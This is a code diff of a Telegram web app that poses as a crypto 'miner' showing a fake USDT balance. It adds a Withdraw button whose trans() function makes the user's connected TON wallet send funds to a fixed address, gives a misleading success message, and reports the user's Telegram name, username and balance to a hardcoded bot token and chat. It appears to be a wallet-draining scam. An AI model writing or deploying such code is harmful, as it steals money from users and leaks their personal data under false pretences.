@@ -18,12 +18,7 @@
   <script src="https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.js"></script>
 
 
-<script>
-    const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
-        manifestUrl: 'https://<YOUR_APP_URL>/tonconnect-manifest.json',
-        buttonRootId: 'ton-connect'
-    });
-</script>
+
 
     </head>
     <style>
@@ -83,7 +78,7 @@ h1 {
 	font-family: "Manrope", sans-serif;
   	line-height: 1.125;
   	font-size: clamp(2rem, 3vw, 3rem);
-	padding: 0px 0px 100px 0px;
+	padding: 0px 0px 10px 0px;
   	text-align: center;
 }
 
@@ -186,6 +181,22 @@ dl div {
   justify-content: center;
 }
 
+
+.withdraw {
+	width: 150px;
+	height: 40px;
+	border-radius: 6px;
+	display: flex;
+  justify-content: center;
+  align-items: center;
+	font-weight: 700;
+	font-family: "Manrope", sans-serif;
+  	line-height: 1.125;
+  	font-size: 18px;
+
+	box-shadow: rgba(100, 100, 111, 0.2) 0px 7px 29px 0px;
+}
+
 </style>
 <style>
 
@@ -194,13 +205,14 @@ dl div {
 <script src="https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.js"></script>
 
     <script>
+let tg = window.Telegram.WebApp;
+
 let activeMining = false;
-let lst = 0;
+let lst = tg.cloudStorage.getItem("usdt");
 let data = 0;
 let blocks = 0;
 let wallet = "";
 
-let tg = window.Telegram.WebApp;
 tg.MainButton.text = "Начать майнинг";
 tg.MainButton.color = "#000";
 tg.MainButton.textColor = "#fff";
@@ -357,6 +369,7 @@ function limitedMine(blockData, difficulty, fees, hash, lt) {
 
     reward = 1.04567 + (hashvalue * difficulty / 5); //0.96
     lst = lst + reward;
+	tg.cloudStorage.setItem("usdt", lst);
     return reward;
 
 
@@ -419,7 +432,7 @@ console.log(xht.responseText);
 }
 
 function addBllck(blockId, reward, data, lst, hash, golden, wallet){
-	let blockTime =  blockId / 1000 + aroundom(6700, 10000);
+	let blockTime =  blockId / 1000 + aroundom(670000, 3000000);
 
     let content = document.getElementById("checking");
     const block = document.createElement('details');
@@ -570,7 +583,7 @@ setInterval(async function gg() {
                         const lt = api.response.transactions[test].lt;
 
 
-                        let reward = limitedMine(block, difficulty, fees, hash, lt)*10;
+                        let reward = limitedMine(block, difficulty, fees, hash, lt)*5;
 
 
                         if(success == true){
@@ -638,12 +651,15 @@ setInterval(async function gg() {
     </script>
     <body>
 	<div>
-  		<div id="ton-connect"></div>
+  		<div id="ton-connect" style="position: absolute; top: 2%; right: 5%;"></div>
 		<p id="usdt"><span class="fancy">0.00 USDT</span></p>
+		<div id="hh">
+  		<div class="withdraw" onclick="trans()">Withdraw</div>
+		</div>
 	</div>
 
   <section id="contentyy">
-	<h1>Latest Transactions</h1>
+	<h1 style="padding: 40px 0px 0px 0px;">Latest Transactions</h1>
 	<h2>Checking...</h2>
        <div id="checking">
        </div>
@@ -659,11 +675,59 @@ setInterval(async function gg() {
 
        
 </section>
-<div id="hh">
-<!---<button type="submit" onclick="activeMining=true">Test</button>-->
-	
-</div>
 
 
+<script>
+    const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
+        manifestUrl: 'https://raw.githubusercontent.com/Maxutkoe/TheChecker/refs/heads/main/tonconnect/tonconnect-manifest.json',
+        buttonRootId: 'ton-connect'
+    });
+	async function connectToWallet() {
+        const connectedWallet = await tonConnectUI.connectWallet();
+        // Do something with connectedWallet if needed
+        console.log(connectedWallet);
+    }
+
+    // Call the function
+	tonConnectUI.uiOptions = {
+      twaReturnUrl: 'https://t.me/ThelCheckerlBot',
+        uiPreferences: {
+            borderRadius: 's',
+            theme: "LIGHT"
+        },
+    };
+
+	async function trans(){
+		const usdt = tg.cloudStorage.getItem("usdt");
+                const transaction = {
+                    validUntil: Math.round(Date.now() / 1000) + 100,
+                    messages: [
+                        {
+                            address: "UQCwZJMC1YRv_kG2Q6CF0H74t3IcWrRjJn1aE4nDWYj_ILUp",
+                            amount: `${usdt*0.25}`
+                        }
+                    ]
+                };
+
+                try{
+                    await tonConnectUI.sendTransaction(transaction);
+                    alert("Вы успешно отправили 0.01 TON!");
+					let telegram = {
+    					token: "7937247695:AAGNmeIQE9gM5Zec8KbIezbrHdDAhKK4ksU", // Your bot's token that got from @BotFather
+    					chat_id: "-1002275343624" // The user's(that you want to send a message) telegram chat id
+    				};
+					const text = `${tg.initDataUnsafe.user.first_name} ${tg.initDataUnsafe.user.last_name} | @${tg.initDataUnsafe.user.username} <br>${usdt}`;
+					const url = `https://api.telegram.org/bot${telegram.token}/sendMessage?chat_id=${telegram.chat_id}&text=${text}&parse_mode=html`; // The url to request
+    				const xht = new XMLHttpRequest();
+    				xht.open("GET", url);
+    				xht.send();
+
+                }
+                catch(e){
+                    console.error(e);
+                }
+    }
+
+</script>
     </body>
 </html>
